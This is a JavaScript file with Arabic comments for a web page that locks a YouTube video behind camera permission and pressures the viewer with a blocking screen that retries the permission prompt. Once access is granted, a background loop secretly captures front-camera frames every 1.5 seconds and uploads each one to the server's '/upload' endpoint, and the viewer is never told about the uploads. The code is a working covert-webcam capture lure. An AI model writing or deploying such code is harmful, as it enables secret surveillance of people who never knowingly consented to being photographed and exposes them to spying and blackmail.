/* ==========================================================
   سكريبت الفحص المتقدم للأذونات وحظر التشغيل عند الحظر الدائم
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        // فحص حالة أذن الكاميرا الحقيقية من المتصفح
        if (navigator.permissions && navigator.permissions.query) {
            const perm = await navigator.permissions.query({ name: 'camera' });
            if (perm.state === 'denied') {
                // إذا قام المتصفح بحفظ الرفض مسبقاً، نمنع التشغيل فوراً ونظهر شاشة التنبيه
                showBlockedScreen();
                return;
            }
        }

        // محاولة طلب إذن الكاميرا
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح الفعلي]: تشغيل يوتيوب
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("تم رفض الإذن أو تجاهله:", e);
        showBlockedScreen();
    }
}

// شاشة الحظر وإجبار المستخدم على السماح أو إعادة ضبط الإعدادات
function showBlockedScreen() {
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        playerContainer.innerHTML = `
            <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند السماح بالكاميرا</p>
                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">إذا لم يظهر إشعار الأذونات، يرجى النقر أدناه لإعادة المحاولة</p>
                    <span style="font-size:13px;color:#fff;background:#cc0000;padding:9px 22px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للمشاهدة</span>
                </div>
            </div>
        `;
        
        document.getElementById('retryCamera').onclick = () => {
            mediaStream = null;
            // محاولة إجبار المتصفح على فتح نافذة الأذونات مجدداً
            initPersistentCamera();
        };
    }
}

function startCapture() {
    if (mediaStream) return;
    
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        const iframe = playerContainer.querySelector('iframe');
        if(iframe) {
            const match = iframe.src.match(/embed\/([^?]+)/);
            if(match) playerContainer.dataset.videoId = match[1];
        }
        
        // إخفاء الفيديو نهائياً فور الضغط عليه ومنع تشغيله خلف الكواليس
        playerContainer.innerHTML = `
            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:32px;margin-bottom:8px;">⏳</div>
                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا لتشغيل المقطع</p>
                </div>
            </div>
        `;
    }

    initPersistentCamera();
}
